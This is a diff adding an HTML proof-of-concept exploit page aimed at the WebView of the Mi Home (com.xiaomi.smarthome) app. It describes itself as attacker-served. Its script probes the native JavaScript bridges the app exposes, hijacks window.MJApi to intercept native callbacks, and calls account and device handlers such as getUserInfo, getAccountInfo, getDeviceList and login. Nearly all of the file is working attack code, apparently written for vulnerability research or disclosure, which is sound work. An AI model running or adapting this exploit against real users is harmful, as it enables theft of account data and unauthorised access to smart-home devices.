@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MiHome PoC</title>
+<style>
+  body{font-family:-apple-system,sans-serif;background:#fff;margin:0;padding:14px;color:#111}
+  h3{margin:0 0 6px;font-size:16px}
+  #out{white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.5;
+       background:#f6f6f6;border:1px solid #ddd;padding:10px;border-radius:6px;min-height:200px}
+  .ok{color:#0a0;font-weight:bold} .warn{color:#c00} .dim{color:#888}
+</style>
+</head>
+<body>
+<h3>⚠️ MiHome WebView · MJApi Bridge PoC</h3>
+<div>This page is served from <b>attacker-controlled https</b> and loaded inside the
+official Mi Home (com.xiaomi.smarthome) WebView via the <code>/main data=</code> override.</div>
+<div id="out" class="dim">init…</div>
+
+<script>
+(function(){
+  var out = document.getElementById('out');
+  var log = [];
+  function push(line){ log.push(line); out.innerHTML = log.join('\n'); }
+  function safe(v){ try{ return (typeof v==='object')?JSON.stringify(v):String(v); }catch(e){ return String(v); } }
+
+  push('[UA] ' + navigator.userAgent);
+  push('[URL] ' + location.href);
+
+  // 1) probe device-control JS bridges exposed to this (attacker) page
+  var bridges = ['MJApi','mihomeJsBridge','_native_interface','_cloud_video_interface',
+                 'statusBarApi','refreshRefInfo','recordEventInfo','Mipay','jscall','JSBridge'];
+  push('\n=== bridge presence ===');
+  bridges.forEach(function(n){
+    try{ push(n+' : '+typeof window[n]); }catch(e){ push(n+' : err'); }
+  });
+
+  // 2) MJApi: capture native callJavaHandler, then reassign window.MJApi so the
+  //    Java callback window.MJApi._handleMessageFromNative(json) (gy0.java:558) lands in our JS.
+  var nativeMJApi = window.MJApi;
+  if (typeof nativeMJApi === 'object' && nativeMJApi && typeof nativeMJApi.callJavaHandler === 'function') {
+    var pending = {};
+    window.MJApi = {
+      _handleMessageFromNative: function(msg){
+        // response from native; display raw + match by callback id if present
+        push('[<-native] ' + safe(msg));
+        try {
+          var o = (typeof msg==='string')?JSON.parse(msg):msg;
+          if (o && o.callbackId && pending[o.callbackId]) pending[o.callbackId]=false;
+        } catch(e){}
+      },
+      callJavaHandler: function(name, params, cb){ return nativeMJApi.callJavaHandler(name, params, cb); }
+    };
+
+    push('\n=== MJApi callJavaHandler (device/account handlers) ===');
+    var cb = 0;
+    function call(name, params){
+      var id = 'poc'+(cb++);
+      pending[id] = true;
+      try { nativeMJApi.callJavaHandler(name, params||'{}', id); push('[call->] '+name+' (cb='+id+')'); }
+      catch(e){ push('[call!] '+name+' '+e); }
+    }
+    // candidate handler names (registered at runtime); wrong names just return RESULT_CANCEL,
+    // still proving the bridge is live from an attacker page.
+    ['getDevice','getDeviceList','getUserInfo','getAccountInfo','getDeviceOAID',
+     'mi_account','getRegion','login','memberResponse','getPrivacy','appInfo'
+    ].forEach(function(n){ call(n, '{}'); });
+  } else {
+    push('\n[MJApi] not present / no callJavaHandler');
+  }
+})();
+</script>
+</body>
+</html>
